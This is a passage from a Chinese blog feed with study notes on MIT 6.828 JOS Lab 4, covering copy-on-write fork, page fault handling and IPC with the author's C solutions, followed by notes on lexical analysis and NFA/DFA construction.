class="number">12</span>)*<span class="number">4</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="Fork代码实现"><a href="#Fork代码实现" class="headerlink" title="Fork代码实现"></a>Fork代码实现</h5><p>pgfault是Custom page fault handler,如果发生页面错误的是对COW页面的写入操作,分配一个物理页拷贝原数据并设定可写</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Custom page fault handler - if faulting page is copy-on-write,</span></span><br><span class="line"><span class="comment">// map in our own private writable copy.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">pgfault</span><span class="params">(<span class="keyword">struct</span> UTrapframe *utf)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *addr = (<span class="type">void</span> *) utf-&gt;utf_fault_va;</span><br><span class="line"><span class="type">uint32_t</span> err = utf-&gt;utf_err;</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((err&amp;FEC_WR)==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"pgfault: the faulting access was not a write\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">pte_t</span> pte = ((<span class="type">pte_t</span>*)UVPT)[PGNUM(addr)];</span><br><span class="line"><span class="keyword">if</span>((pte&amp;PTE_COW)==<span class="number">0</span>)</span><br><span class="line">panic(<span class="string">"pgfault: the faulting access was not to a copy-on-write page\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((r = sys_page_alloc(<span class="number">0</span>,PFTEMP,PTE_W|PTE_U)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"pgfault: page_alloc error when COW\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span>*)PFTEMP,ROUNDDOWN(addr,PGSIZE),PGSIZE);</span><br><span class="line"><span class="keyword">if</span>(sys_page_map(<span class="number">0</span>,PFTEMP,<span class="number">0</span>,ROUNDDOWN(addr,PGSIZE),PTE_W|(pte&amp;PTE_SYSCALL&amp;~PTE_COW)))</span><br><span class="line">{</span><br><span class="line">panic(<span class="string">"pgfault: page_map error when COW\n"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> ((r = sys_page_unmap(<span class="number">0</span>, (<span class="type">void</span> *)PFTEMP)) &lt; <span class="number">0</span>)</span><br><span class="line">        panic(<span class="string">"pgfault: sys_page_unmap() failed: %e\n"</span>, r);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>duppage映射页面pn到envid(子)进程,若为可写页面或COW则将自身(父进程)和envid进程中该页均映射为COW(因为父进程可能也是fork出来的且并没有得到独立的页面,仅是COW).</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">duppage</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">unsigned</span> pn)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">uintptr_t</span> addr = pn*PGSIZE;</span><br><span class="line"></span><br><span class="line"><span class="type">pte_t</span> pte = ((<span class="type">pte_t</span>*)UVPT)[pn];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pte&amp;(PTE_W|PTE_COW))</span><br><span class="line">{</span><br><span class="line"></span><br><span class="line"><span class="comment">//为子进程映射页面并设置PTE_COW</span></span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,(<span class="type">void</span>*)addr,envid,(<span class="type">void</span>*)addr,PTE_COW|PTE_U|(pte&amp;PTE_SYSCALL&amp;~PTE_W)))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//清除父进程的PTE_W并设置PTE_COW</span></span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,(<span class="type">void</span>*)addr,<span class="number">0</span>,(<span class="type">void</span>*)addr,PTE_COW|PTE_U|(pte&amp;PTE_SYSCALL&amp;~PTE_W)))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((r = sys_page_map(<span class="number">0</span>,(<span class="type">void</span>*)addr,envid,(<span class="type">void</span>*)addr,PTE_U|(pte&amp;PTE_SYSCALL)))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>fork创建子进程,为子进程映射(duppage)地址空间.为自身和子进程安装错误处理函数.<br>注意子进程的错误处理函数一定要由父进程安装,因为子进程在调用函数或系统调用时的压栈操作会触发页面错误(目前子进程的栈还是COW的),而错误处理函数还未安装,无法处理.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// User-level fork with copy-on-write.</span></span><br><span class="line"><span class="comment">// Set up our page fault handler appropriately.</span></span><br><span class="line"><span class="comment">// Create a child.</span></span><br><span class="line"><span class="comment">// Copy our address space and page fault handler setup to the child.</span></span><br><span class="line"><span class="comment">// Then mark the child as runnable and return.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Returns: child's envid to the parent, 0 to the child, &lt; 0 on error.</span></span><br><span class="line"><span class="comment">// It is also OK to panic on error.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint:</span></span><br><span class="line"><span class="comment">//   Use uvpd, uvpt, and duppage.</span></span><br><span class="line"><span class="comment">//   Remember to fix "thisenv" in the child process.</span></span><br><span class="line"><span class="comment">//   Neither user exception stack should ever be marked copy-on-write,</span></span><br><span class="line"><span class="comment">//   so you must allocate a new page for the child's user exception stack.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="type">envid_t</span></span><br><span class="line"><span class="title function_">fork</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">envid_t</span> ceid;</span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line">set_pgfault_handler(pgfault);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((ceid = sys_exofork())&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> ceid; </span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(ceid == <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="comment">//child</span></span><br><span class="line">thisenv = &amp;(envs[sys_getenvid()&amp;<span class="number">0x3FF</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (<span class="type">uintptr_t</span> va = <span class="number">0</span>; va &lt; UTOP;) </span><br><span class="line">{</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pde_t</span> uvpd[];</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pte_t</span> uvpt[];</span><br><span class="line"><span class="keyword">if</span> ((uvpd[va &gt;&gt; PDXSHIFT] &amp; PTE_P) == <span class="number">0</span>) </span><br><span class="line">{    <span class="comment">// page table page not found.</span></span><br><span class="line">va += NPTENTRIES * PGSIZE;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> ((uvpt[va &gt;&gt; PTXSHIFT] &amp; PTE_P) == <span class="number">0</span>) </span><br><span class="line">{    <span class="comment">// page table entry not found.</span></span><br><span class="line">va += PGSIZE;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (va == UXSTACKTOP - PGSIZE) </span><br><span class="line">{    <span class="comment">// UXSTACKTOP is not remmaped!</span></span><br><span class="line">va += PGSIZE;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// this page should be duppage()d.</span></span><br><span class="line"><span class="keyword">if</span> ((result = duppage(ceid, (<span class="type">unsigned</span>)(va/PGSIZE))) &lt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">va += PGSIZE;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((result = sys_page_alloc(ceid, (<span class="type">void</span> *)(UXSTACKTOP-PGSIZE), (PTE_U|PTE_W))) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> _pgfault_upcall(<span class="type">void</span>);</span><br><span class="line">sys_env_set_pgfault_upcall(ceid,_pgfault_upcall);</span><br><span class="line">sys_env_set_status(ceid,ENV_RUNNABLE);</span><br><span class="line"><span class="keyword">return</span> ceid;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h5 id="Copy-On-Write流程分析"><a href="#Copy-On-Write流程分析" class="headerlink" title="Copy-On-Write流程分析"></a>Copy-On-Write流程分析</h5><h6 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h6><p>为了开启Copy-On-Write,要为环境安装_pgfault_upcall函数和_pgfault_handler.前者是汇编实现的page fault处理例程的入口点,会调用后者进行page fault的处理并完成traptime状态的恢复.该安装过程由set_pgfault_handler函数完成,且由于上文提过的原因,子进程_pgfault_upcall函数必须由父进程安装.set_pgfault_handler同时为进程分配单独的错误处理堆栈,子进程的错误处理堆栈由父进程分配.</p><h6 id="触发Copy-On-Write"><a href="#触发Copy-On-Write" class="headerlink" title="触发Copy-On-Write"></a>触发Copy-On-Write</h6><p>当进程对带有PTE_COW标志的页进行写入操作时,由于没有PTE_W权限,处理器触发pagefault,陷入内核态,由常规的异常处理流程,最终到达内核态的page_fault_handler函数.该函数检查环境的_pgfault_upcall是否安装,是否是递归页面错误,为页面处理准备UTrapFrame结构,最后env_run返回到用户态从_pgfault_upcall开始执行.</p><h6 id="处理Copy-On-Write"><a href="#处理Copy-On-Write" class="headerlink" title="处理Copy-On-Write"></a>处理Copy-On-Write</h6><p>_pgfault-upcall函数调用用户安装的_pgfault_handler.本实现中该函数流程如下.检查此次pgfault的类型,是否为写入操作,页面是否是COW…若通过检查便为触发pgfault的虚拟地址重新分配一个物理页,拷贝原页的内容.</p><h6 id="恢复到traptime"><a href="#恢复到traptime" class="headerlink" title="恢复到traptime"></a>恢复到traptime</h6><p>现在触发pgfault的地址已经有了独立的一个可写页面,pgfault_upcall函数恢复到traptime状态继续执行,这次的写入操作可以正常进行了.</p><h4 id="Inter-Process-communication-IPC"><a href="#Inter-Process-communication-IPC" class="headerlink" title="Inter-Process communication (IPC)"></a>Inter-Process communication (IPC)</h4><p>本实现中采用的共享方式是:</p><ol><li>通过envs所在的所有环境共享的可读页传递value.</li><li>将sender的某页面映射到recver的页面上<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_ipc_try_send</span><span class="params">(<span class="type">envid_t</span> envid, <span class="type">uint32_t</span> value, <span class="type">void</span> *srcva, <span class="type">unsigned</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">pte_t</span>* pte;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PageInfo</span>* <span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">if</span>((result = envid2env(envid,&amp;e,<span class="number">0</span>)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((e-&gt;env_status != ENV_NOT_RUNNABLE) || (e-&gt;env_ipc_recving==<span class="number">0</span>))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_IPC_NOT_RECV;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(((<span class="type">uintptr_t</span>)srcva!=<span class="number">-1</span>)&amp;&amp;((<span class="type">uintptr_t</span>)e-&gt;env_ipc_dstva!=<span class="number">-1</span>))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((<span class="type">uintptr_t</span>)srcva&gt;=UTOP||(srcva!=ROUNDDOWN(srcva,PGSIZE))||((perm&amp;PTE_SYSCALL)!=perm))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(page = page_lookup(curenv-&gt;env_pgdir,srcva,&amp;pte)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(((*pte&amp;PTE_W)==<span class="number">0</span>)&amp;&amp;((perm&amp;PTE_W)==PTE_W))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> -E_INVAL;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>((result = page_insert(e-&gt;env_pgdir,page,e-&gt;env_ipc_dstva,perm)))</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line">e-&gt;env_ipc_perm = perm;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">e-&gt;env_ipc_perm = <span class="number">0</span>;</span><br><span class="line">e-&gt;env_ipc_recving = <span class="number">0</span>;</span><br><span class="line">e-&gt;env_ipc_from = curenv-&gt;env_id;</span><br><span class="line">e-&gt;env_ipc_value = value;</span><br><span class="line"></span><br><span class="line">e-&gt;env_status = ENV_RUNNABLE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_ipc_recv</span><span class="params">(<span class="type">void</span> *dstva)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">uint32_t</span>)dstva != <span class="number">-1</span>) </span><br><span class="line">{</span><br><span class="line">        <span class="keyword">if</span> (((<span class="type">uintptr_t</span>)dstva &gt;= UTOP) || (dstva!=ROUNDDOWN(dstva,PGSIZE)))</span><br><span class="line">            <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    }</span><br><span class="line">    curenv-&gt;env_ipc_recving = <span class="number">1</span>;</span><br><span class="line">    curenv-&gt;env_ipc_dstva = dstva;</span><br><span class="line">    curenv-&gt;env_status = ENV_NOT_RUNNABLE;</span><br><span class="line">    </span><br><span class="line">    curenv-&gt;env_tf.tf_regs.reg_eax = <span class="number">0</span>;</span><br><span class="line">    sys_yield();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li></ol><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int32_t</span></span><br><span class="line"><span class="title function_">ipc_recv</span><span class="params">(<span class="type">envid_t</span> *from_env_store, <span class="type">void</span> *pg, <span class="type">int</span> *perm_store)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>(pg==<span class="literal">NULL</span>)</span><br><span class="line">pg = (<span class="type">void</span>*)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span>((result = sys_ipc_recv(pg))&lt;<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(from_env_store!=<span class="literal">NULL</span>)</span><br><span class="line">*from_env_store = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(perm_store!=<span class="literal">NULL</span>)</span><br><span class="line">*perm_store=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>(from_env_store!=<span class="literal">NULL</span>)</span><br><span class="line">*from_env_store = thisenv-&gt;env_ipc_from;</span><br><span class="line"><span class="keyword">if</span>(perm_store!=<span class="literal">NULL</span>)</span><br><span class="line">*perm_store=thisenv-&gt;env_ipc_perm;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> thisenv-&gt;env_ipc_value;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">ipc_send</span><span class="params">(<span class="type">envid_t</span> to_env, <span class="type">uint32_t</span> val, <span class="type">void</span> *pg, <span class="type">int</span> perm)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 4: Your code here.</span></span><br><span class="line"><span class="type">int</span> result;</span><br><span class="line"><span class="keyword">if</span>(pg == <span class="literal">NULL</span>)</span><br><span class="line">pg = (<span class="type">void</span>*)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">{</span><br><span class="line">result = sys_ipc_try_send(to_env,val,pg,perm);</span><br><span class="line"><span class="keyword">if</span>(!result)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>(result == -E_IPC_NOT_RECV)</span><br><span class="line">{</span><br><span class="line">sys_yield();</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line">panic(<span class="string">"ipc_send: fail in send--%e\n"</span>,result);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>词法分析</title>
      <link href="/2023/Lexical-Analysis/"/>
      <url>/2023/Lexical-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h2><p>词法分析是编译的第一阶段.词法分析主要任务是读入输入字符,产生记号(token)序列,提交给语法分析使用.<br>由于这种交互模式,词法分析器可以作为语法分析器的子程序或协作程序.语法分析器每次调用词法分析器持续读入字符,直到识别出下一个记号.</p><p>词法分析除了产生记号,也收集记号相关的信息作为记号的属性(比如数字的值,标识符对应的字符串).记号影响语法分析,记号的属性影响记号的翻译.属性一般存储在符号表中.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121650256.png"></p><span id="more"></span><h2 id="记号、模式、词素"><a href="#记号、模式、词素" class="headerlink" title="记号、模式、词素"></a>记号、模式、词素</h2><p>词素是源程序的字符序列</p><p>模式是描述源程序中表示特定记号的词素集合的规则.</p><p>每个符合某模式的词素经词法分析后产生对应的记号.</p><h2 id="记号的描述"><a href="#记号的描述" class="headerlink" title="记号的描述"></a>记号的描述</h2><p>字母表: 有限符号的集合<br>语言是给定字母表上任意字符串的集合.</p><h3 id="正规表达式-Regular-Expressions"><a href="#正规表达式-Regular-Expressions" class="headerlink" title="正规表达式 Regular Expressions"></a>正规表达式 Regular Expressions</h3><p>正规表达式表示的语言叫做正规集.</p><h4 id="非正规集"><a href="#非正规集" class="headerlink" title="非正规集"></a>非正规集</h4><p>正规表达式描述能力有限,其不能描述均衡或嵌套结构,如具有配对括号的符号串集合.<br>正规表达式只能表示固定次数的重复或给定结构的没有指定次数的重复.</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><p>接下来我们要完成对一个给定的正规表达式r的识别器的构造.</p><h2 id="有穷自动机"><a href="#有穷自动机" class="headerlink" title="有穷自动机"></a>有穷自动机</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>语言的识别器是一个程序,它以字符串x作为输入,输出true(接受)或false来表示x是否是语言的句子.</p><p>不确定的有穷自动机(NFA):<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121724289.png"><br>NFA可以由带标记的有向图(状态转换图),转换表表示.<br>F(T,a)=S:在T状态时,如果当前输入字符是a,可以转换到S状态(对于NFA来说,这里的S可能是一个状态集合)<br>当且仅当对应的转换图中存在从开始状态到某个接受状态的路径,使得该路径的便上的标记恰好连成字符串x时,NFA接受字符串x.</p><p>确定的有穷自动机(DFA)是特殊的NFA:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121725005.png"><br>也就是对于当前正在识别的字符a,当前状态有唯一的转换,这非常适合计算机的模拟.</p><h3 id="模拟DFA"><a href="#模拟DFA" class="headerlink" title="模拟DFA"></a>模拟DFA</h3><p>算法: 持续读入字符并根据当前输入字符进行状态转换(“对于当前正在识别的字符a,当前状态有唯一的转换”),当输入结束,检查当前状态是否为一个接受状态.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121735931.png"></p><p>有了DFA的模拟算法,现在只需要构造r的DFA表示.</p><h3 id="从正规表达式到NFA"><a href="#从正规表达式到NFA" class="headerlink" title="从正规表达式到NFA"></a>从正规表达式到NFA</h3><p>然而更容易的方式是从正规表达式r先构造出一个NFA.</p><h4 id="Thompson构造法"><a href="#Thompson构造法" class="headerlink" title="Thompson构造法"></a>Thompson构造法</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121745954.png"></p><p>对于字符表中的每个符号a(包括ε),构造一个如下的NFA.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121750561.png"></p><p>接下来要做的便是根据正规表达式r来”组合”之前产生的NFA.<br>实际就是改变之前各NFA初始状态和接受状态,并增加一些结点和有向边,从而”组合”成r的NFA.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121758670.png"></p><p>这样产生的NFA有以下的性质:<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121802370.png"></p><h3 id="从NFA到DFA"><a href="#从NFA到DFA" class="headerlink" title="从NFA到DFA"></a>从NFA到DFA</h3><p>其实就是消除ε转换(目标1)和对同一输入符号的多种转换(目标2).</p><h4 id="子集构造算法"><a href="#子集构造算法" class="headerlink" title="子集构造算法"></a>子集构造算法</h4><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121820731.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121821896.png"></p><p>分析一下这个算法是怎么实现这两个目标的.</p><p>通过ε-closure()来合并只通过ε转换可以达到的状态为一个状态集,这个状态集是该算法操作的基本单位(目标1).<br>对于某个状态T对某个特定字符a的一种或多种(对于转换的结果而言)转换关系F(T,a),产生一个新的状态(这个状态是NFA中F(T,a)的所有输出状态的集合).之后再根据该状态集合里的每个状态在NFA中的转换关系得到状态集合之间的转换关系(目标2).</p><p>其实,两个目标都是通过将状态合并为状态集合的方式来实现的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310121820231.png"></p><h3 id="NFA的双堆栈模拟"><a href="#NFA的双堆栈模拟" class="headerlink" 